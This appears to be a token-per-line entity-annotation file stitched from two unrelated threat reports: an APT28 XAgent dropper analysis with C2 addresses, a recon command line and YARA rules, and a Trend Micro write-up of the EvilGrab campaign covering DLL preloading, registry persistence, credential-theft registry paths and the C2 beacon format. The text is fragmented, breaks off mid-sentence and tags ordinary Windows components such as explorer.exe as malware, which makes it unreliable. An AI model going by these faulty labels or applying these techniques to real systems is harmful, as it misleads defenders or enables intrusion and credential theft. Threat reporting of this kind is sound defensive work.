using
the
command
line
'
cmd.exe
/
c
tasklist
&
systeminfo
'
.

According
to
the
WHOIS
records
,
the
server
is
located
in
Hong
Kong

The
information
is
sent
to
the
command
and
control
through
HTTPS
communication
using
a
POST
method
.

Figure
2
-
POST
traffic
sniffed

Once
the
malware
has
sent
the
information
about
the
host
configuration
to
the
C2
,
it
will
download
another
file
,
'
upnphost.exe B_malware.drop
'
,
stored
in
the
path
'
%APPDATA%\Local\Temp
'
that
probably
is
the
final
payload
.

Moreover
,
the
executable
implements
a
persistence
mechanism
by
setting
the
registry
key
:

Figure
3
-
Registry
key
for
persistence
mechanism

This
other
file
contacts
another
command
and
control
'
46.183.218.37 B_ip.attack
'
,
located
in
Latvia
:

Figure
4
-
Whois
information
about
46.183.218.37 B_ip.attack

Our
submission
to
VirusTotal

We
also
discovered
that
the
'
upnphost.exe B_malware.drop
'
file
was
submitted
to
Virus
Total
by
us
,
likely
because
the
evasion
technique
implemented
by
the
dropper
.

In
order
to
analyze
the
dropper
,
we
patched
it
.

Once
the
patching
was
applied
we
was
able
to
analyze
the
complete
malicious
behavior
of
the
malware
.

Figure
5
-
The
patch
point
of
the
dropper

The
malicious
code
starts
contacting
the
previously
mentioned
Command
an
Control
and
downloads
this
'
upnphost.exe B_malware.drop
'
file
.

Below
the
results
we
obtained
submitting
the
patched
version
of
the
binary
on
VirusTotal
:

Figure
6
-
VirusTotal
score

AutoIt
Script

The
communication
with
the
command
and
control
is
managed
with
a
script
written
in
the
AutoIt
language
.

This
script
is
embedded
in
the
'
upnphost.exe B_malware.drop
'
file
as
resource
,
and
,
when
it
is
launched
,
it
communicates
with
this
other
server
in
HTTPS
,
sending
some
information
about
the
victim's
computer
.

Figure
7
-
Piece
of
decompiled
code

The
above
figure
shows
a
piece
of
decompiled
code
of
the
AutoIt
script
,
where
the
IP
address
and
the
path
,
with
relative
user
agent
are
masqueraded
in
hexadecimal
encoding
.

After
decoding
the
parameters
,
we
obtain
the
IP
address
,
the
path
and
the
user
agent
used
to
contact
the
C&C
and
send
back
the
information
about
the
target
system
.

IP
https://46.183.218.37/ B_ip.distribute
Path
community/wiki-self-signed/name-signed.php
User
agent
Mozilla
/
5.0
(
Windows
NT
6.1
;
WOW64
;
rv:25.0
)
Gecko
/
20100101
Firefox
/
25.0
Method
POST

Another
peculiarity
,
is
the
name
of
the
function
where
is
present
the
code
for
the
HTTPS
communication
.

It
is
'
checkupdate(
)
'
and
it
seems
that
the
malware
is
instructed
to
contact
periodically
the
C&C
waiting
for
new
commands
.

The
following
picture
shows
the
multi-stage
attack
:

Figure
8
–
The
multistage
attack
scheme
.

sdbn.dll B_malware.drop

This
file
was
retrieved
from
the
threat
intelligence
platforms
and
was
flagged
as
an
APT28
sample
,
such
as
also
the
previous
files
.

It
is
not
clear
if
this
sample
is
connected
to
the
previous
ones
,
but
probably
it
belongs
to
the
same
infection
campaign
because
it
was
uploaded
in
the
same
time
period
on
several
online
sandboxes
.

Another
characteristic
in
common
to
the
previous
files
is
that
,
this
one
is
written
in
Delphi
programming
language
,
like
also
the
four
initial
file
droppers
.

It
is
rare
to
find
a
malware
written
in
Delphi
language
,
but
previous
investigations
conducted
by
other
security
firms
confirm
that
the
APT28
group
already
used
malware
written
in
this
language
in
past
campaigns
.

The
most
important
evidence
emerged
from
the
analysis
of
the
sdbn.dll B_malware.drop
is
that
it
contacted
the
domain
:
'
marina-info.net B_url.distribute
,
'
a
clear
reference
to
the
Italian
Marina
Militare
.
The
domain
is
resolved
in
the
IP
'
191.101.31.250 B_ip.distribute
'
which
is
located
in
Holland
:

Figure
9
-
Whois
information
about
'
marina-info.net B_url.distribute
'

The
communication
to
the
C2
is
performed
also
in
this
case
by
using
the
HTTPS
protocol
.

We
discovered
at
least
three
paths
contacted
with
a
custom
user
agent
header
:

url
https://marina-info.net B_url.distribute
path1
GET
/find/?itwm=QAmXUXFS1aBuXMD4VCMCDg9RQWovPrCA2ag==&btnG=44NK&utm=
olrlGjBnc&aq=e5f1l6bFE1ef&N-Fl8=321vSxDE7MWll
path2
POST
/open/?btnG=zoHM&btnG=RZ&utm=Ezm2RitD&aq=U&itwm=040sLB2hPVAXDiAILXHi_
nYDoZpWbFBwoPg==&oprnd=r0&Mxi3=SVfy
path3
GET
/results/?utm=1V_&oprnd=FTLm7-D&aq=mlKH2SmjAwZjy&itwm=rNOn-
HdIWmsWfPczLAM1xXdxdqFXHodLoYg==
path4
GET
/watch/?itwm=BciqsllH-FDRVo0I6ylP_rBbDJqQNP1wZqA==&from=G&utm=JJ_N&oe=a&from=QdbP&TFWn0=dDViXhemoD6

Table
1
-
url
and
paths
discovered

Like
the
'
upnphost.exe B_malware.drop
' I
malware I
,
this
other
executable
periodically
contacts
the
command
and
control
waiting
for
new
commands
.

However
,
we
discovered
that
the
server
responds
always
with
403
Status
code
Forbidden
,
also
to
the
requests
sent
by
the
malware
itself
.

Figure
10
-
Response
from
the
C2C

This
behavior
could
be
the
result
of
a
server-side
control
implemented
by
the
server
to
allow
the
requests
coming
only
from
particular
IP
addresses
or
simply
it
was
intentionally
disabled
by
the
attackers
likely
because
they
believe
to
have
been
uncovered
by
the
victims
or
by
the
security
firms
.

It
could
be
a
security
mechanism
implemented
by
the
attackers
to
make
hard
the
investigation
of
security
firms
.

Moreover
,
we
decided
to
further
investigate
the
detection
rate
of
this
new
file
on
VirusTotal
.

When
we
started
our
analysis
it
was
zero
,
this
means
that
the
threat
was
completely
undetected
and
currently
the
malicious
code
has
a
detection
rate
of
35
/
65
.

The
attack
threat
map

In
this
paragraph
,
we
show
the
threat
map
with
the
location
of
the
various
IP
addressed
contacted
by
the
samples
we
analyzed
.

Figure
11
-
The
ThreatMap

As
we
can
see
,
the
attack
surface
covered
by
the
hacker
group
is
incredibly
wide
:
there
are
two
different
C2Cs
in
Europe
and
another
one
in
China
to
mislead
the
analysis
and
this
create
confusion
during
the
reconstruction
of
the
complete
cyber-attack
.

rules
import
'
pe
'
rule
Dropper_APT28XAGENTJuly2018
{
meta
:
description
=
'
Yara
Rule
for
dropper
of
APT28
XAGENT
July2018
'
author
=
'
CSE
CybSec
Enterprise
-
Z-Lab
'
last_updated
=
'
2018-07-13
'
tlp
=
'
white
'
category
=
'
informational
'
strings
:
$a
=
{
8B
45
FC
8B
10
FF
}
$b
=
{
33
2E
34
2D
31
39
}
condition
:
(
pe.number_of_sections
==
9
and
pe.sections[3].name
==
'
.bss
'
and
all
of
them
)
or
(
pe.number_of_sections
==
3
and
pe.sections[0].name
==
'
UPX0
'
and
pe.sections[1].name
==
'
UPX1
'
and
pe.number_of_resources
==
70
and
pe.resources[61].type
==
pe.RESOURCE_TYPE_RCDATA
and
pe.resources[60].type
==
pe.RESOURCE_TYPE_RCDATA
and
pe.resources[59].type
==
pe.RESOURCE_TYPE_RCDATA
)
rule
FirstPayload_upnphost_APT28XAGENTJuly2018
{
meta
:
description
=
'
Yara
Rule
for
APT28
XAGENT
July2018
First
Payload
'
author
=
'
CSE
CybSec
Enterprise
-
Z-Lab
'
last_updated
=
'
2018-07-13
'
tlp
=
'
white
'
category
=
'
informational
'
strings
:
$a
=
{
56
AB
37
92
E8
}
$b
=
{
41
75
74
6F
49
74
}

condition
:
pe.number_of_resources
==
26
and
pe.resources[19].type
==
pe.RESOURCE_TYPE_RCDATA
and
pe.version_info['FileDescription']
contains
'
Compatibility
'
and
all
of
them
rule
SecondPayload_sdbn_APT28XAGENTJuly2018
{
meta
:
description
=
'
Yara
Rule
for
APT28
XAGENT
July2018
Second
Payload
sdbn.dll B_malware.drop
'
author
=
'
CSE
CybSec
Enterprise
-
Z-Lab
'
last_updated
=
'
2018-07-13
'
tlp
=
'
white
'
category
=
'
informational
'
strings
:
$a
=
{
0F
BE
C9
66
89
}
$b
=
{
8B
EC
83
EC
10
}
condition
:
pe.number_of_sections
==
6
and
pe.number_of_resources
==
1
and
pe.resources[0].type
==
pe.RESOURCE_TYPE_VERSION
and
pe.version_info['ProductName']
contains
'
Microsoft
'
and
all
of
them
2Q
Report
on
Targeted
Attack
Campaigns

A
TrendLabs
Report
Contents

Introduction
...........................................................................................................................................4

Campaigns
Observed
in
2Q
................................................................................................................5

Targeted
Attack
Campaigns
Profiling
..................................................................................5

Affected
Industry
Sectors
.......................................................................................................6

Affected
Regions
......................................................................................................................6

Attachments
Used
In
Targeted
Attacks
................................................................................7

C&C
Statistics
...........................................................................................................................7

Feature
:
EvilGrab B_malware.drop
Campaign
Targets
Diplomatic
Agencies
..........................................................8

Targets
........................................................................................................................................8

Attack
Vectors
...........................................................................................................................9

Exploits  B_malware.backdoor
,
Payloads  B_malware.backdoor
,
and
Decoy B_malware.backdoor
Documents i
..........................................................................9

DLL B_malware.backdoor
Preloading  i
Using
the
Windows
Shell
and
Fax
Server
...............................................9

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Other
Autorun B_malware.drop
Behaviors
.....................................................................................................10

Stealth
Operation....................................................................................................................10

Registry
Storage
......................................................................................................................11

Media
Grabbing
......................................................................................................................11

User
Credential
Theft
............................................................................................................11

Tencent B_malware.drop
QQ  i
Memory
Reading
:
............................................................................................13

Key
Logging
............................................................................................................................13

Command
&
Control
Servers
...............................................................................................14

Backdoor  B_malware.backdoor
Activity  i
...................................................................................................................15

Trend
Micro
Recommendations
.......................................................................................................21

References
............................................................................................................................................22

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

TREND
MICRO
LEGAL
DISCLAIMER
The
information
provided
herein
is
for
general
information
and
educational
purposes
only
.

It
is
not
intended
and
should
not
be
construed
to
constitute
legal
advice
.

The
information
contained
herein
may
not
be
applicable
to
all
situations
and
may
not
reflect
the
most
current
situation
.

Nothing
contained
herein
should
be
relied
on
or
acted
upon
without
the
benefit
of
legal
advice
based
on
the
particular
facts
and
circumstances
presented
and
nothing
herein
should
be
construed
otherwise
.

Trend
Micro
reserves
the
right
to
modify
the
contents
of
this
document
at
any
time
without
prior
notice.
Translations
of
any
material
into
other
languages
are
intended
solely
as
a
convenience
.

Translation
accuracy
is
not
guaranteed
nor
implied
.

If
any
questions
arise
related
to
the
accuracy
of
a
translation
,
please
refer
to
the
original
language
official
version
of
the
document
.

Any
discrepancies
or
differences
created
in
the
translation
are
not
binding
and
have
no
legal
effect
for
compliance
or
enforcement
purposes
.

Although
Trend
Micro
uses
reasonable
efforts
to
include
accurate
and
up-to-date
information
herein
,
Trend
Micro
makes
no
warranties
or
representations
of
any
kind
as
to
its
accuracy
,
currency
,
or
completeness
.

You
agree
that
access
to
and
use
of
and
reliance
on
this
document
and
the
content
thereof
is
at
your
own
risk
.

Trend
Micro
disclaims
all
warranties
of
any
kind
,
express
or
implied
.

Neither
Trend
Micro
nor
any
party
involved
in
creating
,
producing
,
or
delivering
this
document
shall
be
liable
for
any
consequence
,
loss
,
or
damage
,
including
direct
,
indirect
,
special
,
consequential
,
loss
of
business
profits
,
or
special
damages
,
whatsoever
arising
out
of
access
to
,
use
of
,
or
inability
to
use
,
or
in
connection
with
the
use
of
this
document
,
or
any
errors
or
omissions
in
the
content
thereof
.

Use
of
this
information
constitutes
acceptance
for
use
in
an
'
as
is
'
condition
.

Introduction
Highly
targeted
attacks
refer
to
a
category
of
threats
that
pertain
to
intrusions
by
threat
actors
or
attackers
.

These
attackers
aggressively
pursue
and
compromise
chosen
targets
in
order
to
steal
sensitive
information
.

These
are
not
conducted
through
separate
attacks
;
rather
,
they
comprise
of
a
series
of
attempts
over
time
to
get
deeper
and
deeper
into
a
target's
network
.

Each
attempt
may
either
succeed
or
fail
,
but
the
overall
goal
is
to
penetrate
the
target
'
s
network
and
acquire
information
.

Malware B_malware.drop
is
typically
used
as
an
attack
vector
,
but
the
real
threat
involves
human
operators
who
adapt
,
adjust
,
and
improve
their
methods
based
on
the
victim
'
s
defenses
.

Enterprises
should
consider
targeted
attacks
a
high-priority
threat
because
of
the
considerable
damage
they
incur
.

The
human
and
systemic
weaknesses
that
allow
an
attacker
to
compromise
an
organization
can
be
minimized
and
mitigated
with
correct
practices
and
solutions
.

However
,
these
same
weaknesses
can
never
be
fully
resolved
.

Trend
Micro
monitors
the
targeted
attack
landscape
in
order
to
identify
ongoing
campaigns
and
provide
additional
threat
intelligence
useful
for
identifying
the
existence
of
these
campaigns
in
an
enterprise
network
.

This
quarterly
report
presents
the
targeted
attack
campaigns
observed
and
mitigated
by
Trend
Micro
based
on
reported
customer
cases
,
as
well
as
our
own
independently
gathered
data
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Campaigns
Observed
in
2Q

Targeted
Attack
Campaigns

Profiling
We
encountered
a
variety
of
targeted
campaigns
in
the
second
quarter
of
the
year
.

These
include
the
following
:
•
IXESHE B_malware.backdoor
.
The
IXESHE B_malware.backdoor
campaign
is
known
for
targeting
East
Asian
governments
,
electronics
manufacturers
,
and
telecommunications
firms
.

We
released
a
white
paper
discussing
this
campaign
.
1

IXESHE B_malware.backdoor
has
been
active
since
2012
.

•
ELISE B_malware.drop
.
This
recently
discovered
campaign
also
targets
government
agencies
in
the
Asia
Pacific
region
.

It
is
called
ELISE B_malware.drop
after
certain
strings
found
in
its
unpacked
code
.

(
We
detect
the
Malware B_malware.backdoor
used
by
this
campaign
as
BKDR_ELISE B_malware.drop
.
)

•
ZEGOST B_malware.backdoor
.
This
family
of
backdoors B_malware.backdoor
(
aka
HTTP
Tunnel
)
is
Chinese
in
origin
and
was
used
in
attacks
against
Asian
government
organizations
.

•
BEEBUS/MUTTER B_malware.backdoor
.
This
is
a
targeted
campaign
believed
to
be
associated
with
the
Comment
Crew
attacker
group
because
of
the
use
of
encrypted
/
obfuscated
HTML
comments
to
hide
their
C&C B_malware.backdoor
transactions
.

•
TravNet B_malware.backdoor
.
This
campaign
made
use
of
a
Malware B_malware.backdoor
family
identified
as
NetTraveler B_malware.infosteal
based
on
the
strings
found
in
the
Malware B_malware.backdoor
code
.

The
Malware B_malware.backdoor
is
detected
as
BKDR_TRAVLAR  B_malware.backdoor
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Affected
Industry
Sectors

Our
data
indicates
that
the
majority
of
targeted
attack
victims
are
various
government
agencies
.

Targeted
firms
from
the
technology
sector
include
telecommunication
firms
,
Internet
service
providers
,
and
software
companies
.

The
financial
services
sector
and
the
aerospace
industry
were
also
targeted
this
quarter
.

Targeted
attacks
discovered
by
industry

Affected
Regions

The
targeted
attacks
that
we
analyzed
were
heavily
concentrated
in
Asia
,
particularly
Taiwan
and
Japan
.

Targeted
attacks
discovered
by
region

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Attachments
Used
In
Targeted
Attacks

Based
on
our
findings
,
the
most
common
type
of
email
attachment
type
used
in
targeted
attacks
were
file
archives
of
various
forms
.

When
uncompressed
,
these
archives
typically
contain
the
malicious B_malware.backdoor
payload i
itself
,
which
the
user
may
then
run
directly
.

Alternately
,
they
may
also
contain
a
.DOC
file
that
contains
exploit
code
.

RTF
files
made
up
the
second
most
common
file
type
.

File
types
used
in
targeted
attacks

Frequently
,
the
.EXE  B_malware.drop
files
we
see
are
made
to
appear
as
ordinary
documents
or
folders
using
appropriately
chosen
icons
.

In
addition
,
we
also
saw
an
increased
use
of
files
that
make
use
of
right-to-left
override
(
RTLO
)
in
Unicode
.

C&C
Statistics

We
were
also
able
to
monitor
the
activity
of
various
C&C
servers
related
to
targeted
attacks
.

By
volume
of
C&C
server
activity
,
the
following
countries
ranked
as
follows
:

Australia
South
Korea
Germany
Japan
Italy
Taiwan
India
United
States
Vietnam
Netherlands
Others

Volume
percent
of
C&C
server
activity
per
country

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

5610
Feature
:
EvilGrab B_malware.drop
Campaign
Targets
Diplomatic
Agencies

In
this
report
,
we
will
provide
a
detailed
analysis
of
the
EvilGrab B_malware.drop
campaign
.

This
campaign
was
first
found
targeting
certain
Asian
and
European
governments
.

Its
name
is
derived
from
its
behavior
of
grabbing
audio
,
video
,
and
screenshots
from
affected
machines
.

Currently
,
the
Malware B_malware.backdoor
used
by
EvilGrab B_malware.drop
belongs
to
one
of
three
Malware B_malware.backdoor
families
:
•
BKDR_HGDER  B_malware.backdoor
•
BKDR_EVILOGE  B_malware.backdoor
•
BKDR_NVICM  B_malware.backdoor

Targets

Our
research
indicates
that
EvilGrab B_malware.drop
activity
is
most
prevalent
in
China
and
Japan
,
although
it
is
also
present
in
other
parts
of
the
world
.

Government
organizations
were
,
by
far
,
the
most
affected
by
EvilGrab B_malware.drop
.

This
geolocation
is
based
on
the
IP
addresses
of
the
victims
.

Therefore
,
foreign
institutions
within
China
would
be
identified
as
coming
from
China
;
the
same
would
hold
true
for
all
countries
.

EvilGrab B_malware.drop
was
also
found
in
the
United
States
,
Canada
,
France
,
Spain
,
and
Australia
,
among
others
.

China
Japan
South
Africa
Thailand
Canada
Others

Map
of
top
affected
countries
by
targeted
attacks

GOVERNMENT
NON-GOVERNMENT
ORGANIZATIONS
MILITARY
ONLINE
MEDIA

Sectors
affected
by
targeted
attacks

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Attack
Vectors

Research
indicates
that
EvilGrab B_malware.drop
is
primarily
distributed
through
spear-phishing  B_malware.infosteal
emails
with
malicious
attachments
that
exploit
various
vulnerabilities
to
run
malicious
code
.

Among
the
attachment
types
are
:
•
Microsoft
®
Excel
®
spreadsheets
(
CVE
-
2012
-
0158
and
CVE
-
2012
-
2543
)
•
PDFs
(
CVE
-
2013
-
0640
)
•
Microsoft®
Word®
documents
(
CVE
-
2012
-
0158
)
A
.RAR  B_malware.drop
file  i
with
a
folder
named
thumbs.db
was
also
seen
containing
malicious
code
.

By
using
this
name
,
the
intention
was
to
disguise
itself
as
the
Windows
thumbnail
cache
.

A
shortcut  B_malware.drop
file  i
(
.LNK  B_malware.drop
)
was
also
seen
in
the
.RAR  B_malware.drop
file  i
,
which
used
a
folder
icon
to
make
users
believe
it
was
another
folder
.

In
reality
,
running
the
.LNK  B_malware.drop
file  i
executes
the
Malware B_malware.drop
.

In
addition
,
the
.RAR  B_malware.drop
file  i
contains
a
desktop.ini
file
in
order
to
change
the
thumbs.db
folder
icon
into
the
icon
of
the
Windows
thumbnail
cache
.

Exploits  B_malware.backdoor
,
Payloads  B_malware.backdoor
,
and
Decoy B_malware.backdoor
Documents i

The
EvilGrab B_malware.drop
campaign's
use
of
exploits  B_malware.backdoor
,
payloads  B_malware.backdoor
,
and
decoy B_malware.backdoor
documents i
is
similar
to
the
Taidoor B_malware.drop
campaign  i
in
2012
.
2
The
primary
difference
is
that
EvilGrab B_malware.drop
variants
have
multiple
layers
of
shellcode
.

In
addition
,
some
variants
copy
the
file
name
and
use
it
as
the
decoy B_malware.backdoor
document  i
file  i
name
.

Other
variants
overwrite
the
exploit
document
with
the
contents
of
the
decoy B_malware.backdoor
document  i
.

As
noted
above
,
some
variants
also
use
disguised
folders
and
shortcuts
and
do
not
use
exploits
to
run
their
code
.

DLL B_malware.backdoor
Preloading  i
Using
the
Windows
Shell
and
Fax
Server

DLL B_malware.backdoor
preloading  i
is
a
vulnerability
that
has
been
documented
for
over
three
years
.
3

The
EvilGrab B_malware.drop
campaign
makes
use
of
this
vulnerability
for
its
AutoRun B_malware.drop
routine i
.

Whenever
it
is
run
,
the
Windows
shell
(
explorer.exe  B_malware.drop
)
loads
a
component
of
the
fax
server
in
Windows
,
fxsst.dll B_malware.backdoor
.

This
is
normally
located
in
the
System32
folder
.

Whenever
an
instance
of
explorer.exe  B_malware.drop
is
launched
(
i.e.
,
at
every
system
startup
)
,
the
system
searches
for
the
said
.DLL  B_malware.backdoor
file  i
and
loads
it
.

EvilGrab B_malware.drop
drops
one
of
its
.DLL  B_malware.backdoor
components  i
in
the
Windows
folder
,
where
explorer.exe  B_malware.drop
is
also
located
.

The
malicious
.DLL  B_malware.backdoor
(
also
named
fxsst.dll B_malware.backdoor
)
is
loaded
instead
of
the
legitimate
copy
.

It
also
serves
as
the
loader
of
the
main
backdoor  B_malware.backdoor
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

While
DLL B_malware.backdoor
preloading  i
has
been
used
by
other
Malware B_malware.drop
in
the
past
,
it
is
less
common
to
see
it
specifically
target
explorer.exe  B_malware.drop
.

Other
Malware B_malware.drop
families
that
use
this
vulnerability
typically
target
executable
files
outside
of
Window
;
EvilGrab B_malware.drop
targets
a
part
of
Windows
itself
.

Other
Autorun B_malware.drop
Behaviors i

In
addition
to
the
above
behavior
,
EvilGrab B_malware.drop
also
creates
the
following
registry
entry
to
enable
its
automatic B_malware.drop
execution i
at
every
system
startup
:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
UKey
=
'
%Application
Data%\360\Live360.exe
'
The
file
%Application  B_malware.drop
Data%\360\Live360.exe i
is
a
copy
of
one
of
the
Malware B_malware.drop
components
.

It
also
creates
a
shortcut
under
the
Startup
folder
in
the
Start
menu
:
IEChecker.lnk B_malware.drop
•
Target
:
'
%UserProfile%\IEChecker.exe
'
–L
Icon
:
%Full
path
of
Iexplorer.exe%
(
This
uses
the
Internet
Explorer
icon
and
disguise
itself
as
part
of
Internet
Explorer
.
)

The
above
file
is
also
a
copy
of
one
of
the
malicious
components
.

Stealth
Operation

EvilGrab B_malware.drop
has
three
primary
components
:
one
.EXE  B_malware.drop
file
and
two
.DLL  B_malware.backdoor
files i
.
The
.EXE  B_malware.drop
file
acts
as
the
installer
for
all
of
the
EvilGrab B_malware.drop
components
.
One
of
the
.DLL  B_malware.backdoor
files i
serves
as
a
loader
for
the
other
.DLL  B_malware.backdoor
file  i
,
which
is
the
main
backdoor  B_malware.backdoor
component i
.

Some
variants
of
EvilGrab B_malware.drop
delete
the
.EXE  B_malware.drop
file
after
installation
to
cover
its
tracks
more
effectively
.
As
noted
earlier
,
the
loader
file
is
named
fxsst.dll B_malware.backdoor
.
However
,
examination
of
its
header
states
that
its
actual
file
name
is
supposed
to
be
svchost.dll B_malware.backdoor
.

These
components
are
also
encrypted
and
saved
in
the
registry
.

To
add
stealth
to
its
backdoor  B_malware.backdoor
routines  i
,
it
uses
a
legitimate
process
context's
memory
space
to
inject
the
main
backdoor  B_malware.backdoor
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

By
default
,
this
backdoor  B_malware.backdoor
injects
itself
into
the
svchost.exe B_malware.backdoor
or
winlogon.exe  B_malware.backdoor
process
.

It
also
checks
if
certain
processes
related
to
certain
security
products
are
running
on
the
affected
system
.

The
specific
processes
targeted
are
:
•
avp.exe B_malware.backdoor
•
klwtblfs.exe  B_malware.backdoor
•
starter.exe B_malware.backdoor
•
wmifw.exe B_malware.backdoor

Other
variants
of
this
Malware B_malware.drop
also
check
if
other
security
products
are
present
.

It
is
not
clear
why
EvilGrab B_malware.drop
specifically
targets
these
products
.

However
,
it
is
possible
that
the
attackers
determined
that
targets
for
this
campaign
are
likely
running
these
products
.

Registry
Storage

EvilGrab B_malware.drop
stores
its
components
in
the
following
registry
entries
:

HKCU\Software\rar
and/or
HKLM\SOFTWARE\rar
data
=
{Encrypted
copy
of
the
main
backdoor  B_malware.backdoor
DLL B_malware.backdoor
}
s
=
{
Encrypted
copy
of
the
loader
DLL B_malware.backdoor
}
e
=
{
Encrypted
string
which
points
to
the
full
path
of
the
installer
EXE
}

Media
Grabbing

To
capture
video
,
EvilGrab B_malware.drop
creates
a
capture
window
with
the
class
name
of
ESET
.

It
uses
the
Sample
Grabber
filter
(
part
of
the
DirectShow
technology
in
Windows
)
to
directly
perform
grabbing.4
It
also
uses
Wave
APIs
to
capture
audio.5

User
Credential
Theft

EvilGrab B_malware.drop
steals
user
credentials
related
to
the
following
applications
and/or
protocols
:
•
HTTP
•
HTTPMail
•
IMAP
•
Internet
Explorer
(
IE
)
•
Microsoft
Outlook
Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

•
MSN
•
POP3
•
Protected
Storage
•
SMTP
•
Windows
Messaging
EvilGrab B_malware.drop
steals
these
credentials
by
parsing
the
following
registry
keys
:

Windows
Messaging
Subsystem\Profiles
•
HKCU\Software\Microsoft\Windows
NT\CurrentVersion\
•
HKCU\Software\Microsoft\Windows
Messaging
Subsystem\Profiles
•
HKCU\Software\Microsoft\Internet
Account
Manager\Accounts
•
HKCU\Software\Microsoft\Office\Outlook\
OMI
Account
Manager\Accounts

It
queries
the
above
keys
for
related
values
that
correspond
to
the
applications
and
protocols
listed
earlier
.

The
values
are
then
decrypted
using
the
system
library
pstorec.dll B_malware.backdoor
.

It
also
steals
login
credential
from
IE
autocomplete
entries
.

It
does
this
by
first
parsing
the
index.dat
files
in
the
IE
History
folder
.

It
then
collects
autocomplete
entries
from
the
following
registry
key
:

HKCU\Software\Microsoft\Internet
Explorer\IntelliForms\Storage2

It
then
initiates
a
brute
force
attack
on
encrypted
credentials
using
the
CryptUnprotectData B_malware.drop
API i
.

However
,
it
will
only
try
to
steal
passwords
from
IE's
password-protected
sites
and
MSN
Explorer
Signup
if
kav.exe
(
related
to
a
security
product
)
is
not
running
in
the
system
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Tencent B_malware.drop
QQ  i
Memory
Reading

If
the
active
window
is
Tencent B_malware.drop
QQ  i
(
specifically
,
QQ2009  B_malware.drop
through
QQ2012  B_malware.drop
)
,
EvilGrab B_malware.drop
will
attempt
to
steal
information
by
directly
reading
the
process's
memory
and
checking
if
the
class
name
of
the
focused
window
is
not
named
'
EDIT
.
'

The
contents
of
the
process's
memory
are
then
saved
onto
the
system's
hard
drive
as
%UserProfile%\users.bin
.

It
is
then
sent
back
to
the
backdoor's  B_malware.backdoor
C&C B_ip.cncsvr
server
.

The
file
on
the
hard
drive
is
encrypted
;
specifically
,
the
data
is
XORed
with
the
key
0x66
.

Key
Logging

EvilGrab B_malware.drop
also
possesses
keylogging
capabilities
.

The
logged
keystrokes
are
then
sent
back
to
the
C&C B_ip.cncsvr
and
saved
to
%User
Profile%\users.bin
.

The
file
on
the
hard
drive
is
encrypted
;
specifically
,
the
data
is
XORed
with
the
key
0x66
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Command B_malware.backdoor
& i
Control i
Servers

Each
backdoor  B_malware.backdoor
has
one
to
three
C&C
servers
in
its
code
.

Some
of
C&C
servers
that
we
have
seen
from
our
accumulated
data
are
as
follows
:

•
112.121.182.150 B_ip.cncsvr
•
113.10.246.46 B_ip.cncsvr
•
113.10.190.55 B_ip.cncsvr
•
202.130.112.231 B_ip.cncsvr
•
micoosofts.com  B_url.cncsvr
•
qtds1979.3322.org B_url.cncsvr
•
qtds1979.gicp.net B_url.cncsvr
•
server1.micoosofts.com  B_url.cncsvr
•
sxl1979.gicp.net  B_url.cncsvr
•
webmonder.gicp.net  B_url.cncsvr
•
webposter.gicp.net  B_url.cncsvr
•
www.yahooip.net B_url.cncsvr
•
www.yahooprotect.com  B_url.cncsvr
•
www.yahooprotect.net  B_url.cncsvr
•
yacooll.com B_url.cncsvr
•
yahooip.net B_url.cncsvr
•
yahooprotect.com  B_url.cncsvr

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Backdoor  B_malware.backdoor
Activity

To
start
its
connection
to
its
C&C
server
,
the
backdoor  B_malware.backdoor
component i
will
first
send
5-bytes
(
\x01\x00\x00\x00\x33
)
.

The
C&C
will
reply
if
it
accepts
the
connection
.

The
backdoor  B_malware.backdoor
then
replies
with
a
beacon
message
,
the
contents
of
which
are
as
follows
:

Description
Sample
value
(
referring
to
sample
packet
illustrated
below
)
Size
of
internal
buffer
<
%d
>
=xFFC
(
4092
)
Hardcoded
0xA0
<
%c
>
=
xA0
Backdoor
identifier
1
<
%s
>
=
'
RB0318
'
Host
IP
<
%s
>
=
'
111.222.123.132
'
Host
port
<
%d
>
=
432
(
1074.
)
OS
version
<
%s
>
=
'
OSVERSION
'
Hostname
<
%s
>
=
'
HOSTNAME
'
User
name
<
%s
>
=
'
USERNAME
'
Camera
device
detected
<
%
s>
=
'
No
'
Date
time
<
%s
>
=
'
0Ìì0Ð¡Ê±0•Ö0Ãë
'
Presence
of
removable
drive
<
%s
>
=
'
No
'
Backdoor
identifier
2
<
%s
>
=
'
V2010-v24
'
Process
ID
of
the
process
where
the
backdoor
is
injected
<
%d
>
=
21C
(
540.
)
Hardcoded
0x00
<
%d
>
=
0

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Either
backdoor  B_malware.backdoor
identifier
1
or
backdoor  B_malware.backdoor
identifier
2
acts
as
the
campaign
code
or
marker
for
EvilGrab B_malware.drop
campaigns
,
which
is
recognizable
by
the
C&C
server
and
/
or
attacker
.

Some
of
the
identifiers
we
saw
in
backdoor  B_malware.backdoor
identifier
1
are
:
•
006
•
007
•
0401
•
072002
•
3k-Ja-0606
•
3k-jp01
•
4k-lyt25
•
88j
•
e-0924
•
LJ0626
•
RB0318

Some
of
the
identifiers
seen
in
our
accumulated
data
in
backdoor  B_malware.backdoor
identifier
2
are
as
follows
:
•
V2010-v16
•
V2010-v24

We
noted
a
correlation
between
the
MZ
/
PE
headers
of
variants
and
the
strings
in
backdoor  B_malware.backdoor
identifier
2
.

Variants
with
a
V2010-v24
identifier
have
a
proper
MZ
/
PE
header
;

variants
with
a
V2010-v16
header
have
portions
of
their
header
overwritten
with
JPEG
strings
.

These
variants
require
a
loader
component
to
load
them
into
memory
in
order
to
be
executed
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Below
is
a
sample
packet
sent
at
the
beginning
of
the
connection
:

Code
snapshot

EvilGrab B_malware.drop
variants
possess
a
wide
variety
of
possible
backdoor  B_malware.backdoor
commands
.

The
